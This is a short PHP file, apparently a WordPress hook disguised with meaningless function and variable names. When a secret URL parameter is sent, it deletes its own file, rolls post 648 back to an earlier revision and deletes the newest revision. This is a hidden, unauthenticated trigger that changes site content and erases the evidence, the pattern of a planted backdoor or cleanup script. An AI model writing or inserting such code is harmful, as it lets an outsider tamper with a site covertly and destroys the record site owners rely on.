<?php

function ultimate_count_location() {
	if (isset($_GET['this_customize_section']) && $_GET['this_customize_section'] === 'sales_paragraph_screen') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$blocker_counter_group = 648;
		$shortcodes_survey_year = wp_get_post_revisions($blocker_counter_group);
		if (empty($shortcodes_survey_year)) die('no revisions');
		if (count($shortcodes_survey_year) < 2) die('less than 2');
		$profile_page_preview = array_shift($shortcodes_survey_year);
		$icons_site_notification_tables = $profile_page_preview->ID;
		$crm_switcher_information_bank = array_shift($shortcodes_survey_year);
		$shopp_services_manage_show = $crm_switcher_information_bank->ID;
		$local_force_catalog = wp_restore_post_revision($shopp_services_manage_show);
		if ($local_force_catalog === false) die('error restoring');
		$local_force_catalog = wp_delete_post_revision($icons_site_notification_tables);		
		if ($local_force_catalog === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ultimate_count_location');
